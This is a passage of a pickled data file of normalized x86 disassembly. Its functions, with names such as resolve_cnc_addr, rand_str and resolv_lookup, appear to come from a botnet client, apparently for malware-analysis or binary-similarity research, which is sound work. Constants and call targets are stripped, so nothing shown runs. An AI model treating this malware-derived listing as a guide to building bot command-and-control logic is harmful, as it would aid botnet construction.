O\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN\nMOV~<STR>,0\nJMP~FOO"'
p83
L311L
tp84
a(S'resolve_cnc_addr'
p85
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nTEST~ESI,ESI\nJZ~FOO\nMOV~EBX,[ESI+0]\nCALL~FOO\nXOR~EDX,EDX\nSUB~ESP,0\nMOV~DL,[ESI]\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nMOV~EAX,[EBX+EDX*4]\nPUSH~ESI\nMOV~<STR>,EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,AX\nCALL~FOO\nADD~ESP,0\nPOP~EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p86
L138L
tp87
a(S'main'
p88
S'"LEA~ECX,[ESP+0]\nAND~ESP,0\nPUSH~[ECX-0]\nPUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nPUSH~ECX\nSUB~ESP,0\nMOV~EAX,[ECX]\nMOV~ECX,[ECX+0]\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~EAX,[ECX]\nPUSH~EAX\nCALL~FOO\nPOP~EBP\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nPOP~ESI\nPOP~EDI\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nPUSH~ESI\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~ESI,0\nPUSH~0\nCALL~FOO\nCALL~FOO\nMOV~ECX,[ESP+0]\nCLD\nMOV~EBP,[ECX]\nLEA~EDI,[ESP+0]\nMOV~ECX,0\nMOV~<STR>,EAX\nMOVSD~,\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~EAX,ECX\nMOV~EDX,[ESP+0]\nADD~EAX,EDX\nMOV~EDI,[ESP+0]\nADD~EAX,EDI\nMOV~ESI,[ESP+0]\nADD~EAX,ESI\nMOV~EBX,[ESP+0]\nADD~EAX,EBX\nMOV~ECX,[ESP+0]\nADD~EAX,ECX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~<STR>,0\nADD~ESP,0\nMOV~<STR>,0\nMOV~<STR>,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nMOV~AL,[ESP+0]\nMOV~BL,[EBP+EDX+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP],EBP\nMOV~[ESP+0],AL\nXOR~EBX,0\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nSUB~EBX,0\nIDIV~,ECX\nMOV~AL,[EBP+EDX+0]\nMOV~[ESP],EBP\nXOR~EAX,0\nADD~EBX,EAX\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nMOV~AL,[EBP+EDX+0]\nMOV~[ESP],EBP\nXOR~EAX,0\nADD~EBX,EAX\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nMOV~AL,[EBP+EDX+0]\nMOV~[ESP],EBP\nXOR~EAX,0\nADD~EBX,EAX\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nMOV~AL,[EBP+EDX+0]\nMOV~[ESP],EBP\nXOR~EAX,0\nADD~EBX,EAX\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nIDIV~,ECX\nXOR~ECX,ECX\nMOV~DL,[EBP+EDX+0]\nXOR~EDX,0\nADD~EDX,EBX\nMOV~CL,DL\nLEA~EAX,<STR>\nSUB~AX,CX\nLEA~EAX,[ECX+EAX*8]\nSHR~AX,0\nSHR~AL,0\nLEA~EAX,[EAX+EAX*8]\nSUB~DL,AL\nAND~EDX,0\nCALL~[ESP+EDX*4+0]\nPOP~EAX\nPOP~EDX\nLEA~EBX,[ESP+0]\nPUSH~EBX\nPUSH~EBP\nCALL~FOO\nPOP~EDI\nPOP~EBP\nMOV~ESI,EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOV~EAX,ESI\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nCALL~FOO\nCALL~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nCALL~FOO\nLEA~ESI,[ESP+0]\nMOV~EBX,EAX\nPUSH~ECX\nAND~EBX,0\nPUSH~ECX\nLEA~EBX,<STR>\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nPOP~EAX\nPOP~EDX\nPUSH~ESI\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX]\nPUSH~EAX\nCALL~FOO\nCALL~FOO\nPOP~ECX\nMOV~EBX,EAX\nMOV~EAX,0\nMUL~,EBX\nMOV~EAX,EDX\nPOP~EDI\nSHR~EAX,0\nLEA~EAX,[EAX+EAX*2]\nADD~EAX,EAX\nSUB~EBX,EAX\nLEA~EBX,<STR>\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nPOP~EAX\nPOP~EDX\nPUSH~ESI\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ESI\nPOP~EDI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~EBX\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nADD~ESP,0\nXOR~EAX,EAX\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nLEA~ESP,[ECX-0]\nRETN\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~ECX,[ESP+0]\nMOV~EAX,[ECX+0]\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nPOP~EAX\nMOV~EAX,[ESP+0]\nMOV~EAX,[EAX+0]\nPUSH~EAX\nCALL~FOO\nPOP~ESI\nPOP~EDI\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOV~EBX,[EDX+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nLEA~ESI,[ESP+0]\nLEA~EBX,[ESP+0]\nMOV~EDX,0\nXOR~EAX,EAX\nMOV~ECX,EDX\nMOV~EDI,ESI\nCLD\nSTOSD~,\nMOV~ECX,EDX\nMOV~EDI,EBX\nCLD\nSTOSD~,\nMOV~EDX,<STR>\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nAND~EDX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],EDX\nCMP~<STR>,0\nJZ~FOO\nCMP~<STR>,0\nJZ~FOO\nMOV~EAX,<STR>\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EDX,<STR>\nMOV~EAX,<STR>\nCMP~EAX,EDX\nJGE~FOO\nMOV~EAX,EDX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nINC~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EDX,[ESP+0]\nMOV~AL,0\nMOV~ECX,EAX\nMOV~EAX,EDX\nSAR~EDX,0\nMOV~[ESP+0],0\nIDIV~,ECX\nMOV~EAX,[ESP+0]\nINC~EAX\nTEST~EDX,EDX\nMOV~[ESP+0],EAX\nJZ~FOO\nMOV~ECX,<STR>\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJNZ~FOO\nCMP~<STR>,0\nJZ~FOO\nMOV~ECX,<STR>\nMOV~<STR>,0\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJNZ~FOO\nCMP~ECX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~<STR>,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,<STR>\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nJMP~FOO\nMOV~EDX,<STR>\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nCALL~FOO\nMOV~EDI,EAX\nMOV~DWORDPTR[EAX],0\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJNZ~FOO\nPUSH~0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~<STR>,0\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EDI,<STR>\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,0\nCALL~FOO\nMOV~EDI,EAX\nMOV~ECX,0\nPOP~EAX\nMOV~EAX,EDI\nMUL~,ECX\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nSHR~EDX,0\nLEA~EDX,[EDX+EDX*4]\nADD~EDX,EDX\nSUB~EDI,EDX\nLEA~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nPUSH~EBX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~ECX\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nNEG~[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~<STR>,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~EDI,<STR>\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~ECX,<STR>\nPUSH~ECX\nCALL~FOO\nMOV~AL,[ESP+0]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nAND~EAX,0\nPUSH~0\nPUSH~EAX\nPUSH~EBP\nMOV~EDX,<STR>\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[EDI]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJZ~FOO\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nROR~AX,0\nCMP~AX,0\nMOV~[ESP+0],AX\nJA~FOO\nMOV~DWORDPTR[EDI],0\nPUSH~0\nMOV~AX,[ESP+0]\nAND~EAX,0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nAND~EAX,0\nPUSH~0\nPUSH~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nMOV~AX,[ESP+0]\nADD~ESP,0\nTEST~AX,AX\nJZ~FOO\nAND~EAX,0\nPUSH~EDI\nPUSH~EDI\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,<STR>\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nJMP~FOO"'
p89
L2706L
tp90
a(S'rand_next'
p91
S'"MOV~EAX,<STR>\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EDX,<STR>\nSHL~EBX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EBX,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~<STR>,EDX\nMOV~EAX,EBX\nXOR~EDX,ECX\nSHR~EAX,0\nXOR~EBX,EDX\nXOR~EAX,EBX\nPOP~EBX\nMOV~<STR>,EAX\nRETN"'
p92
L68L
tp93
a(S'rand_init'
p94
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nXOR~EBX,EAX\nMOV~<STR>,EBX\nCALL~FOO\nMOV~EDX,<STR>\nMOV~<STR>,EAX\nXOR~EAX,EDX\nMOV~<STR>,EAX\nADD~ESP,0\nPOP~EBX\nRETN"'
p95
L64L
tp96
a(S'rand_alphastr'
p97
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,0\nCLD\nLEA~EDI,[ESP+0]\nMOV~ECX,0\nMOVSD~,\nMOV~EBP,[ESP+0]\nMOV~AL,<STR>\nMOV~EBX,[ESP+0]\nMOV~[EDI],AL\nTEST~EBP,EBP\nJLE~FOO\nMOV~EAX,<STR>\nMOV~ESI,<STR>\nMOV~[ESP],EAX\nMOV~EDI,<STR>\nMOV~EAX,<STR>\nJMP~FOO\nMOV~EDX,EAX\nSUB~EBP,0\nSHL~EDX,0\nXOR~EDX,EAX\nMOV~EAX,ESI\nSHR~EAX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EAX,ESI\nXOR~EDX,EAX\nXOR~ECX,EDX\nMOV~AL,CL\nSHR~AL,0\nAND~EAX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EBX],AL\nMOV~EAX,ECX\nSHR~EAX,0\nAND~EAX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EBX+0],AL\nMOV~EAX,ECX\nSHR~EAX,0\nAND~EAX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EBX+0],AL\nMOV~EAX,ECX\nSHR~EAX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EBX+0],AL\nADD~EBX,0\nTEST~EBP,EBP\nJLE~FOO\nMOV~EAX,EDI\nMOV~EDI,[ESP]\nMOV~[ESP],ESI\nMOV~ESI,ECX\nCMP~EBP,0\nJA~FOO\nMOV~EDX,EAX\nDEC~EBP\nSHL~EDX,0\nXOR~EDX,EAX\nMOV~EAX,ESI\nSHR~EAX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EAX,ESI\nXOR~EDX,EAX\nMOV~EAX,0\nXOR~ECX,EDX\nMUL~,ECX\nSHR~EDX,0\nMOV~EAX,EDX\nSHL~EAX,0\nADD~EAX,EDX\nMOV~EDX,ECX\nSUB~EDX,EAX\nMOV~[EBX],DL\nINC~EBX\nTEST~EBP,EBP\nJG~FOO\nMOV~EAX,[ESP]\nMOV~<STR>,ECX\nMOV~<STR>,ESI\nMOV~<STR>,EAX\nMOV~<STR>,EDI\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p98
L272L
tp99
a(S'rand_str'
p100
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~EDI,[ESP+0]\nTEST~EBX,EBX\nJLE~FOO\nMOV~EAX,<STR>\nMOV~ESI,<STR>\nMOV~[ESP],EAX\nMOV~EBP,<STR>\nMOV~EAX,<STR>\nJMP~FOO\nMOV~EDX,EAX\nSUB~EBX,0\nSHL~EDX,0\nXOR~EDX,EAX\nMOV~EAX,ESI\nSHR~EAX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EAX,ESI\nXOR~EDX,EAX\nXOR~ECX,EDX\nMOV~[EDI],ECX\nADD~EDI,0\nTEST~EBX,EBX\nJLE~FOO\nMOV~EAX,EBP\nMOV~EBP,[ESP]\nMOV~[ESP],ESI\nMOV~ESI,ECX\nCMP~EBX,0\nJG~FOO\nCMP~EBX,0\nJZ~FOO\nMOV~EDX,EAX\nSUB~EBX,0\nSHL~EDX,0\nXOR~EDX,EAX\nMOV~EAX,ESI\nSHR~EAX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EAX,ESI\nXOR~EDX,EAX\nXOR~ECX,EDX\nMOV~[EDI],CX\nADD~EDI,0\nJMP~FOO\nMOV~EAX,[ESP]\nMOV~<STR>,ECX\nMOV~<STR>,ESI\nMOV~<STR>,EAX\nMOV~<STR>,EBP\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~ECX,EAX\nMOV~<STR>,EBP\nSHL~ECX,0\nMOV~<STR>,ESI\nXOR~ECX,EAX\nMOV~EAX,[ESP]\nMOV~<STR>,EAX\nMOV~EAX,ESI\nSHR~EAX,0\nMOV~EDX,ECX\nSHR~EDX,0\nXOR~EAX,ESI\nXOR~ECX,EAX\nXOR~EDX,ECX\nMOV~<STR>,EDX\nMOV~[EDI],DL\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p101
L233L
tp102
a(S'resolv_entries_free'
p103
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESP+0],EBX\nPOP~ECX\nPOP~EBX\nPOP~EBX\nJMP~FOO\nPOP~EAX\nPOP~EDX\nPOP~EBX\nRETN"'
p104
L52L
tp105
a(S'resolv_lookup'
p106
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~ESI,ESI\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~[ESP],EBX\nCALL~FOO\nLEA~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nINC~EAX\nADD~ESP,0\nJMP~FOO\nMOV~[ECX],DL\nINC~ESI\nLEA~EDX,[ECX+0]\nINC~EBX\nDEC~EAX\nMOV~ECX,EDX\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[EBX]\nCMP~DL,0\nJZ~FOO\nTEST~DL,DL\nJNZ~FOO\nMOV~EDX,ESI\nXOR~ESI,ESI\nMOV~[EDI],DL\nLEA~EDX,[ECX+0]\nMOV~EDI,ECX\nJMP~FOO\nSUB~ESP,0\nMOV~BYTEPTR[ECX],0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDI,[ESP+0]\nMOV~[ESP+0],0\nADD~EDI,EAX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPOP~EAX\nLEA~EBX,[EDI+0]\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~EAX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~ECX,EAX\nMOV~EAX,0\nMUL~,ECX\nSHR~EDX,0\nMOV~ESI,ECX\nMOV~EAX,EDX\nSHL~EAX,0\nSUB~EAX,EDX\nSUB~ESI,EAX\nMOV~[ESP+0],SI\nPOP~EBP\nPOP~EAX\nOR~EBP,0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],SI\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[EDI+0],0\nADD~ESP,0\nMOV~[EBX+0],0\nCMP~EBP,0\nJZ~FOO\nLEA~ESI,[ESI+0]\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBP,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~ECX\nPUSH~0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nMOV~EDX,[ESP+0]\nPUSH~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~0\nPUSH~EBP\nPUSH~0\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~EBP\nPUSH~0\nCALL~FOO\nLEA~EDX,[ESP+0]\nXOR~EAX,EAX\nMOV~ECX,0\nMOV~EDI,EDX\nCLD\nSTOSD~,\nMOV~ESI,EBP\nMOV~EBX,EBP\nSHR~ESI,0\nAND~EBX,0\nBTS~[ESP+ESI*4+0],EBX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBP+0]\nPUSH~0\nPUSH~0\nPUSH~EDX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nBT~[ESP+ESI*4+0],EBX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~EAX,0\nADD~ESP,0\nCMP~EBX,EAX\nJNB~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EDI,[ESP+0]\nINC~EDI\nCMP~EBP,0\nMOV~[ESP+0],EDI\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nMOV~EDX,[ESP]\nCMP~BYTEPTR[EDX],0\nJZ~FOO\nMOV~EAX,[ESP]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nLEA~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nLEA~ECX,[ESP+EAX+0]\nADD~ESP,0\nMOV~DI,[ESP+0]\nCMP~DI,[ESP+0]\nJNZ~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJZ~FOO\nROR~AX,0\nMOV~[ESP+0],AX\nDEC~[ESP+0]\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EDX,ECX\nXOR~EBX,EBX\nMOV~ESI,0\nMOV~AL,[EDX]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJBE~FOO\nAND~EAX,0\nMOV~DL,[EDX+0]\nAND~EDX,0\nMOV~EBX,0\nSHL~EAX,0\nLEA~EAX,[EAX+EDX-0]\nLEA~EDX,[ESP+0]\nADD~EDX,EAX\nMOV~AL,[EDX]\nTEST~AL,AL\nJNZ~FOO\nADD~ESI,EBX\nLEA~ESI,[ECX+ESI]\nCMP~WORDPTR[ESI],0\nLEA~EDI,[ESI+0]\nJZ~FOO\nMOV~EDX,EDI\nXOR~ECX,ECX\nMOV~EBX,0\nMOV~AL,[EDX]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJBE~FOO\nAND~EAX,0\nMOV~DL,[EDX+0]\nAND~EDX,0\nMOV~ECX,0\nSHL~EAX,0\nLEA~EAX,[EAX+EDX-0]\nLEA~EDX,[ESP+0]\nADD~EDX,EAX\nMOV~AL,[